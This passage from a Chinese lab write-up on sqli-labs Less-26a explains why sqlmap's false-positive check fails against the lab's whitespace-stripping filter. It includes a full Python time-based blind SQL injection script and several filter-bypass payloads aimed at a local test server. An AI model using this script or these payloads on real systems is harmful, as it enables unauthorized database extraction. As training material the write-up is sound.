randInt3)):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> conf.notString <span class="keyword">and</span> <span class="built_in">any</span>(conf.notString <span class="keyword">in</span> getUnicode(_) <span class="keyword">for</span> _ <span class="keyword">in</span> (randInt1, randInt2, randInt3)):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> randInt3 &gt; randInt2 &gt; randInt1:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> checkBooleanExpression(<span class="string">&quot;%d%s%d&quot;</span> % (randInt1, INFERENCE_EQUALS_CHAR, randInt1)):</span><br><span class="line">                retVal = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> PAYLOAD.TECHNIQUE.BOOLEAN <span class="keyword">not</span> <span class="keyword">in</span> injection.data:</span><br><span class="line">                checkBooleanExpression(<span class="string">&quot;%d%s%d&quot;</span> % (randInt1, INFERENCE_EQUALS_CHAR, randInt2))          <span class="comment"># just in case if DBMS hasn&#x27;t properly recovered from previous delayed request</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> checkBooleanExpression(<span class="string">&quot;%d%s%d&quot;</span> % (randInt1, INFERENCE_EQUALS_CHAR, randInt3)):          <span class="comment"># this must not be evaluated to True</span></span><br><span class="line">                retVal = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> checkBooleanExpression(<span class="string">&quot;%d%s%d&quot;</span> % (randInt3, INFERENCE_EQUALS_CHAR, randInt2)):        <span class="comment"># this must not be evaluated to True</span></span><br><span class="line">                retVal = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> <span class="keyword">not</span> checkBooleanExpression(<span class="string">&quot;%d%s%d&quot;</span> % (randInt2, INFERENCE_EQUALS_CHAR, randInt2)):    <span class="comment"># this must be evaluated to True</span></span><br><span class="line">                retVal = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> checkBooleanExpression(<span class="string">&quot;%d %d&quot;</span> % (randInt3, randInt2)):                                <span class="comment"># this must not be evaluated to True (invalid statement)</span></span><br><span class="line">                retVal = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> retVal:</span><br><span class="line">            warnMsg = <span class="string">&quot;false positive or unexploitable injection point detected&quot;</span></span><br><span class="line">            logger.warning(warnMsg)</span><br><span class="line"></span><br><span class="line">        kb.injection = popValue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure></div>

<p>简单分析一下这个函数，<code>retValue</code> 表示注入点是否误判，默认为不误判 <code>true</code> 。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">all</span>(_ <span class="keyword">in</span> (PAYLOAD.TECHNIQUE.BOOLEAN, PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED) <span class="keyword">for</span> _ <span class="keyword">in</span> injection.data) <span class="keyword">or</span> (<span class="built_in">len</span>(injection.data) == <span class="number">1</span> <span class="keyword">and</span> PAYLOAD.TECHNIQUE.UNION <span class="keyword">in</span> injection.data <span class="keyword">and</span> <span class="string">&quot;Generic&quot;</span> <span class="keyword">in</span> injection.data[PAYLOAD.TECHNIQUE.UNION].title):</span><br></pre></td></tr></table></figure></div>

<p>这里比较抽象，首先是 <code>all()</code> 函数，它接受一个可迭代的元素，若该元素中的所有子元素都为 <code>true</code> 则返回 <code>true</code> 。而里面的内容语法需要类比，例如：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = (_ <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">4</span>));</span><br><span class="line"><span class="keyword">for</span> aa <span class="keyword">in</span> a:</span><br><span class="line"> <span class="built_in">print</span>(aa);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># True</span></span><br><span class="line"><span class="comment"># False</span></span><br></pre></td></tr></table></figure></div>

<p>括号中的内容返回一个迭代器，其具体内容是一个 python 特有的生成迭代器的句式，<code>_</code> 表示一个匿名变量，在该句式中他也可以携带&#x2F;传递内容，表示的是在元组 <code>(1,4)</code> 中的各个元素是否在元组 <code>(1,2,3)</code> 中，结果从迭代器中被依次返回为 <code>true, false</code> 分别表示 1 在而 4 不在。</p>
<p>常量 <code>PAYLOAD.TECHNIQUE.BOOLEAN</code> 是一类表示注入类型的枚举内容，值为 1 表示布尔盲注。<code>injection.data</code> 是一个字典，其中存储的是注入的参数，如本次注入检查出来是布尔类型，该变量内部就会有一个键值对：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="number">1</span>: &#123;</span><br><span class="line">		... <span class="comment"># 布尔盲注细节</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此这里的 if 实际上是在检查：</p>
<ol>
<li>注入类型是否只有『布尔盲注、时间盲注与堆叠注入』这三种类型。</li>
<li>注入类型单一且为联合注入且其中的『Title』字段值中含有字符串『Generic』</li>
</ol>
<p>这是在判断是否需要『falsePositiveCheck』。</p>
<p>随后它利用循环语句生成了三个随机数，保证这三个数从小到大排序，且内容不会与布尔盲注的<strong>有效性</strong>判断点混淆。</p>
<p>用这三个随机数『R1，R2，R3』，sqlmap 依次用以下句型检测注入可行性：</p>
<ol>
<li><code>r1 = r1</code> ：必须有效</li>
<li><code>r1 = r2</code> ：必须无效</li>
<li><code>r1 = r3</code> ：必须无效</li>
<li><code>r2 = r3</code> ：必须无效</li>
<li><code>r2 = r2</code> ：必须有效</li>
<li><code>r3 r2</code> ：为非法句型，必须无效</li>
</ol>
<p>6 步中任意一步有问题都会被判定为假注入点。其中第六条两个随机数默认用空格隔开。很不巧，本题所有的空白字符都被替换为空了，见 Sqli-Labs-Less-26a 的源码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>包括注释与所有空白字符，无一幸免。因此在第六步中，原本的 <code>r3 r2</code> 变成了 <code>r3r2</code> ，两个数字相连变成了一串数字，可被隐式转换为有效的布尔值，因此反而返回了有效的页面，让 sqlmap 做出<strong>假注入点</strong>的判定。回到脚本，rblank 替换的空白字符全部被过滤，因此无法通过第六条检测；mblank 将空格替换成了一些非法字符，可以通过第六条检测，但由于这些非法字符只在特定版本的 Mysql 中被识别为分界符，在本地测试时 <code>Mysql=5.7.26</code> 不符合要求，因此无法作为有效的空白字符用于探测其他信息，故而我们恢复不了任何有效内容。</p>
<p>其本质问题还是，Sqlmap 的 Payload 构建是基于空白字符可用的情况，它并未考虑过使用『完全不依赖空格作为分界符』的 payload，如『括号构造句型』或是『利用符号 <code>||, &amp;&amp;</code> 的界符特性省略分界符』等情况。另一方面，这种绕过也无法依赖 Tamper 模块实现，因此『Less-26a』从设计上讲就无法被 Sqlmap 成功注入。</p>
<hr>
<h2 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h2><p>考虑手搓一个盲注脚本，注入数据库信息。</p>
<p>首先是括号替代空格的查询语句：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema<span class="operator">=</span><span class="string">&#x27;%s&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>由于本体过滤了关键词”or”，双写来绕过：”infoorrmation_schema”。</p>
<p>最终编写了脚本”less-26a-blind.py”，采用”Requests”库实现，单线程任务，速度极慢，有待改进，脚本如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq   <span class="comment"># By Requests</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">timeBlindInjection</span>:   <span class="comment"># 时间盲注</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.url = <span class="string">&quot;http://localhost:83/sqli-labs/Less-26a/&quot;</span></span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        self.<span class="built_in">range</span> = [<span class="number">0</span>, <span class="number">127</span>]</span><br><span class="line">        self.timeout = <span class="number">1</span>    <span class="comment"># 延时 1s</span></span><br><span class="line">        self.payload = &#123;</span><br><span class="line">            <span class="string">&quot;length&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;pos&quot;</span>: <span class="number">1</span>,   <span class="comment"># 二分检测位置</span></span><br><span class="line">                <span class="string">&quot;cot&quot;</span>: <span class="string">f&quot;?id=0&#x27;||if(length((%s))%s,sleep(<span class="subst">&#123;self.timeout&#125;</span>),1)||&#x27;0&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;detail&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;pos&quot;</span>: <span class="number">2</span>,</span><br><span class="line">                <span class="string">&quot;cot&quot;</span>: <span class="string">f&quot;?id=0&#x27;||if(ascii(substr((%s),%d,1))%s,sleep(<span class="subst">&#123;self.timeout&#125;</span>),1)||&#x27;0&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        self.target = &#123;</span><br><span class="line">        <span class="comment">#    &quot;cur_database&quot;: &quot;select(database())&quot;,</span></span><br><span class="line">            <span class="comment"># &quot;database&quot;: &quot;select(group_concat(schema_name))from(infoorrmation_schema.schemata)&quot;,</span></span><br><span class="line">            <span class="comment"># &quot;table&quot;: &quot;select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;%s&#x27;)&quot;,</span></span><br><span class="line">            <span class="comment"># &quot;column&quot;: &quot;select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#x27;%s&#x27;)&quot;,</span></span><br><span class="line">            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;select(secret_FPMB)from(challenges.5idc4x45h8)&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.result = &#123;&#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">for</span> key, val <span class="keyword">in</span> self.target.items():</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;%s&quot;</span> <span class="keyword">in</span> val):</span><br><span class="line">                val = val % (<span class="built_in">input</span>(val+<span class="string">&quot;\n-&gt;&quot;</span>))</span><br><span class="line">            self.result[key] = self.inject(val)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inject</span>(<span class="params">self, query: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:    <span class="comment"># 注入指定内容</span></span><br><span class="line">        t_len = self.BS(<span class="string">&quot;length&quot;</span>, [query])  <span class="comment"># 先得到长度</span></span><br><span class="line">        t_res = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t_len):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\r<span class="subst">&#123;t_res&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            res = self.BS(<span class="string">&quot;detail&quot;</span>, [query, i+<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">if</span> res != -<span class="number">1</span>:</span><br><span class="line">                t_res += <span class="built_in">chr</span>(res)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">input</span>(res)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\r<span class="subst">&#123;t_res&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> t_res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">BS</span>(<span class="params">self, key: <span class="built_in">str</span>, parms: <span class="built_in">list</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        left, right = self.<span class="built_in">range</span></span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right):</span><br><span class="line">            mid = (left+right)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> self.get(self.getPayload(key, parms, <span class="string">&quot;&quot;</span>.join([<span class="string">&quot;=&quot;</span>, <span class="built_in">str</span>(mid)]))):  <span class="comment"># 查找正确</span></span><br><span class="line">                <span class="keyword">return</span> mid</span><br><span class="line">            <span class="keyword">elif</span> self.get(self.getPayload(key, parms, <span class="string">&quot;&quot;</span>.join([<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(mid)]))):</span><br><span class="line">                left = mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getPayload</span>(<span class="params">self, key: <span class="built_in">str</span>, parms: <span class="built_in">list</span>, parm: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        tmp = parms.copy()</span><br><span class="line">        tmp.insert(self.payload[key][<span class="string">&quot;pos&quot;</span>], parm)</span><br><span class="line">        <span class="keyword">return</span> self.payload[key][<span class="string">&quot;cot&quot;</span>] % <span class="built_in">tuple</span>(tmp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, data</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = rq.get(self.url+data, timeout=self.timeout-<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception:   <span class="comment"># 命中</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    inject = timeBlindInjection()</span><br><span class="line">    inject.run()</span><br></pre></td></tr></table></figure></div>

<p>打算用自带线程池的 <code>HackRequests</code> 库优化一下脚本，后面再说。</p>
<hr>
<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>试试联合注入：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;)union(select(database()));&#x27;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;)union(select(column_name)from(information_schema.columns)where(table_name=&quot;users&quot;));&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>发现不起效果，利用括号构造不出有效的 payload 能闭合后面的引号与括号。</p>
]]></content>
      <categories>
        <category>Security</category>
        <category>Range</category>
      </categories>
  </entry>
</search>
